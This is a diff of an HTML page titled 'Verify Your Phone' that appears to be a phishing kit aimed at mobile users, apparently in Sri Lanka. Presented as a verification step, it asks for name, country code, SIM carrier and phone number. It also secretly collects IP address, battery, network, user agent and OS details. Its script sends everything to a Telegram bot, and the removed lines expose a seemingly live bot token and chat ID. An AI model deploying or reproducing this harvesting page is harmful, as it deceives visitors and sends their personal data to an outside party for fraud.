@@ -4,176 +4,110 @@
   <meta charset="UTF-8" />
   <title>Verify Your Phone</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-<style>
-  @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
-  * { box-sizing: border-box; }
-  html, body {
-    margin: 0;
-    padding: 0;
-    height: 100%;
-    font-family: 'Poppins', sans-serif;
-    color: #fff;
-    background: transparent;
-    overflow-y: auto;
-  }
-
-  body::before {
-    content: "";
-    position: fixed;
-    top: 0; left: 0;
-    width: 100%; height: 100%;
-    background: rgba(0, 0, 0, 0.4);
-    z-index: 0;
-  }
-
-  video#bgVideo {
-    position: fixed;
-    top: 0; left: 0;
-    width: 100%; height: 100%;
-    object-fit: cover;
-    z-index: -1;
-    filter: brightness(0.4) saturate(1.2) contrast(1.2);
-  }
-
-  .container {
-    position: relative;
-    z-index: 2;
-    background: rgba(25, 0, 0, 0.75);
-    padding: 35px 30px;
-    border-radius: 18px;
-    max-width: 420px;
-    width: 90%;
-    box-shadow:
-      0 0 15px 4px rgba(255, 23, 68, 0.7),
-      0 0 30px 8px rgba(255, 23, 68, 0.5);
-    text-align: center;
-    margin: 5% auto;
-  }
-
-  h2 {
-    margin-bottom: 28px;
-    font-weight: 600;
-    font-size: 26px;
-    color: #ff1744;
-    text-shadow: 0 0 6px #ff1744aa;
-  }
-
-  .input-group {
-    margin-bottom: 18px;
-    text-align: left;
-  }
-
-  label {
-    display: block;
-    font-weight: 600;
-    font-size: 14px;
-    margin-bottom: 6px;
-    color: #ff8a80;
-    text-shadow: 0 0 4px #ff8a80cc;
-  }
-
-  select, input[type="tel"], input[type="text"] {
-    width: 100%;
-    padding: 12px 14px;
-    border-radius: 12px;
-    background: #2d0000;
-    border: none;
-    color: #fff;
-    font-size: 16px;
-    box-shadow: inset 0 0 6px #000;
-    transition: box-shadow 0.3s ease;
-  }
-
-  select:focus, input[type="tel"]:focus, input[type="text"]:focus {
-    outline: none;
-    box-shadow: 0 0 12px #ff1744;
-  }
-
-  button {
-    background: linear-gradient(45deg, #d50000, #c51162);
-    border: none;
-    padding: 14px;
-    width: 100%;
-    border-radius: 14px;
-    font-size: 18px;
-    font-weight: 700;
-    color: white;
-    cursor: pointer;
-    box-shadow:
-      0 0 6px #ff174488,
-      0 0 12px #ff1744aa,
-      0 0 24px #ff1744bb;
-    transition: box-shadow 0.3s ease, transform 0.3s ease;
-  }
-
-  button:hover {
-    transform: scale(1.05);
-    box-shadow:
-      0 0 10px #ff1744aa,
-      0 0 18px #ff1744cc,
-      0 0 36px #ff1744dd;
-  }
-
-  .error {
-    margin-top: 16px;
-    font-size: 15px;
-    font-weight: 600;
-    color: #ff5252;
-    text-shadow: 0 0 8px #ff5252aa;
-    opacity: 0;
-    transform: translateY(12px);
-    transition: all 0.3s ease;
-  }
-
-  .error.show {
-    opacity: 1;
-    transform: translateY(0);
-    animation: shake 0.4s;
-  }
-
-  @keyframes shake {
-    0% { transform: translateX(0); }
-    25% { transform: translateX(-6px); }
-    50% { transform: translateX(6px); }
-    75% { transform: translateX(-6px); }
-    100% { transform: translateX(0); }
-  }
-
-  /* ✅ Progress Overlay */
-  #progressOverlay {
-    position: fixed;
-    top: 0; left: 0;
-    width: 100vw; height: 100vh;
-    background: rgba(0, 0, 0, 0.8);
-    z-index: 9999;
-    display: none;
-    justify-content: center;
-    align-items: center;
-    flex-direction: column;
-  }
-
-  #progressOverlay .loader {
-    border: 6px solid rgba(255, 255, 255, 0.2);
-    border-top: 6px solid #ff1744;
-    border-radius: 50%;
-    width: 60px;
-    height: 60px;
-    animation: spin 1s linear infinite;
-    margin-bottom: 15px;
-  }
-
-  @keyframes spin {
-    0% { transform: rotate(0deg); }
-    100% { transform: rotate(360deg); }
-  }
-
-  #progressOverlay p {
-    color: #fff;
-    font-size: 18px;
-    font-weight: 600;
-    text-align: center;
-  }
-</style>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
+    * { box-sizing: border-box; }
+    html, body {
+      margin: 0; padding: 0;
+      font-family: 'Poppins', sans-serif;
+      height: 100%; overflow: hidden;
+      background: #000;
+      color: white;
+    }
+    video#bgVideo {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      object-fit: cover;
+      z-index: 0;
+      filter: brightness(0.4) saturate(1.2) contrast(1.2);
+    }
+    .container {
+      position: relative;
+      z-index: 2;
+      background: rgba(25, 0, 0, 0.75);
+      padding: 35px 30px;
+      border-radius: 18px;
+      max-width: 420px;
+      width: 90%;
+      box-shadow:
+        0 0 15px 4px rgba(255, 23, 68, 0.7),
+        0 0 30px 8px rgba(255, 23, 68, 0.5);
+      text-align: center;
+      margin: 5% auto;
+    }
+    h2 {
+      margin-bottom: 24px;
+      font-size: 24px;
+      color: #ff1744;
+      text-shadow: 0 0 6px #ff1744aa;
+    }
+    .input-group {
+      margin-bottom: 16px;
+      text-align: left;
+    }
+    label {
+      display: block;
+      font-weight: 600;
+      font-size: 14px;
+      margin-bottom: 5px;
+      color: #ff8a80;
+    }
+    input, select {
+      width: 100%;
+      padding: 12px;
+      border-radius: 12px;
+      border: none;
+      background: #2d0000;
+      color: white;
+      font-size: 16px;
+    }
+    input:focus, select:focus {
+      outline: none;
+      box-shadow: 0 0 12px #ff1744;
+    }
+    button {
+      width: 100%;
+      padding: 14px;
+      border-radius: 14px;
+      background: linear-gradient(45deg, #d50000, #c51162);
+      font-size: 16px;
+      font-weight: bold;
+      color: white;
+      border: none;
+      cursor: pointer;
+      box-shadow: 0 0 20px #ff174488;
+    }
+    button:hover {
+      transform: scale(1.05);
+      box-shadow: 0 0 30px #ff1744cc;
+    }
+    .error {
+      margin-top: 14px;
+      font-size: 15px;
+      font-weight: bold;
+      color: #ff5252;
+      text-shadow: 0 0 6px #ff5252aa;
+      opacity: 0;
+      transition: 0.3s;
+    }
+    .error.show {
+      opacity: 1;
+    }
+    #progress {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0, 0, 0, 0.75);
+      z-index: 99;
+      color: white;
+      display: none;
+      justify-content: center;
+      align-items: center;
+      font-size: 18px;
+      font-weight: bold;
+    }
+  </style>
 </head>
 <body>
 
@@ -181,27 +115,11 @@
   <source src="video.mp4" type="video/mp4">
 </video>
 
-<!-- ✅ PROGRESS OVERLAY -->
-<div id="progressOverlay">
-  <div class="loader"></div>
-  <p>🔐 Verifying your details... Please wait</p>
-</div>
-
 <div class="container">
   <h2>📱 Verify Phone</h2>
-
-  <div class="input-group">
-    <label for="firstName">First Name</label>
-    <input type="text" id="firstName" placeholder="Enter first name" />
-  </div>
-
-  <div class="input-group">
-    <label for="lastName">Last Name</label>
-    <input type="text" id="lastName" placeholder="Enter last name" />
-  </div>
-
-  <div class="input-group">
-    <label for="country">Select Country Code</label>
+  <div class="input-group"><label>First Name</label><input id="firstName" type="text" placeholder="John"></div>
+  <div class="input-group"><label>Last Name</label><input id="lastName" type="text" placeholder="Doe"></div>
+  <div class="input-group"><label>Country</label>
     <select id="country">
       <option value="+94">🇱🇰 Sri Lanka (+94)</option>
       <option value="+91">🇮🇳 India (+91)</option>
@@ -210,9 +128,7 @@
       <option value="+65">🇸🇬 Singapore (+65)</option>
     </select>
   </div>
-
-  <div class="input-group">
-    <label for="sim">Select SIM Connection</label>
+  <div class="input-group"><label>SIM</label>
     <select id="sim">
       <option value="">-- Select your SIM --</option>
       <option>Dialog</option>
@@ -221,19 +137,16 @@
       <option>Hutch</option>
     </select>
   </div>
-
-  <div class="input-group">
-    <label for="phone">Phone Number</label>
-    <input type="tel" id="phone" placeholder="Enter number" />
-  </div>
-
+  <div class="input-group"><label>Phone Number</label><input id="phone" type="tel" placeholder="77XXXXXXX"></div>
   <button onclick="sendData()">Verify</button>
   <div class="error" id="errorMsg"></div>
 </div>
 
+<div id="progress">⏳ Verifying... Please wait</div>
+
 <script>
-  const botToken = "8079056355:AAGP1alTryOpzFmtk8ZxNWKxs6q59Mbuj70";
-  const chatId = "8182050140";
+  const botToken = "YOUR_TELEGRAM_BOT_TOKEN";
+  const chatId = "YOUR_CHAT_ID";
 
   async function getIP() {
     try {
@@ -246,23 +159,22 @@
   }
 
   async function sendData() {
-    const error = document.getElementById("errorMsg");
-    const overlay = document.getElementById("progressOverlay");
-    error.classList.remove("show");
-
     const firstName = document.getElementById('firstName').value.trim();
     const lastName = document.getElementById('lastName').value.trim();
-    const code = document.getElementById('country').value;
-    const sim = document.getElementById('sim').value;
     const phone = document.getElementById('phone').value.trim();
+    const sim = document.getElementById('sim').value;
+    const country = document.getElementById('country').value;
+    const error = document.getElementById('errorMsg');
 
-    if (!firstName || !lastName || !sim || !phone) {
+    error.classList.remove("show");
+
+    if (!firstName || !lastName || !phone || !sim) {
       error.textContent = "❗ Please fill all fields!";
       error.classList.add("show");
       return;
     }
 
-    overlay.style.display = "flex"; // Show progress
+    document.getElementById('progress').style.display = 'flex';
 
     const ip = await getIP();
     const battery = await navigator.getBattery?.();
@@ -271,18 +183,35 @@
     const netType = navigator.connection?.effectiveType || "Unknown";
     const date = new Date().toLocaleString();
     const ua = navigator.userAgent;
+    const platform = navigator.platform;
+    const os = navigator.userAgentData?.platform || "Unknown";
+    const vendor = navigator.vendor || "Unknown";
 
     const message = `
 📩 *New Submission*
 
 👤 Name: ${firstName} ${lastName}
-📞 Phone: ${code} ${phone}
+
+📞 Phone: ${country}${phone}
+
 📶 SIM: ${sim}
+
 🌐 IP Address: ${ip}
+
 🔋 Battery: ${batteryLevel}
+
 ⚡ Charging: ${charging}
+
 📡 Network: ${netType}
+
 📱 Device: ${ua}
+
+🏷️ Manufacturer: ${vendor}
+
+🖥️ OS: ${os}
+
+💻 Platform Info: ${platform}
+
 📅 Time: ${date}
     `;
 
@@ -291,17 +220,16 @@
     form.append("text", message);
     form.append("parse_mode", "Markdown");
 
-    try {
-      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: "POST",
-        body: form
-      });
-      alert("✅ Verification complete!");
-    } catch (e) {
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: "POST",
+      body: form
+    }).then(() => {
+      window.location.href = "indexone.html"; // redirect after complete
+    }).catch(() => {
       alert("❌ Failed to send to Telegram.");
-    } finally {
-      overlay.style.display = "none"; // Hide progress
-    }
+    }).finally(() => {
+      document.getElementById('progress').style.display = 'none';
+    });
   }
 </script>
 
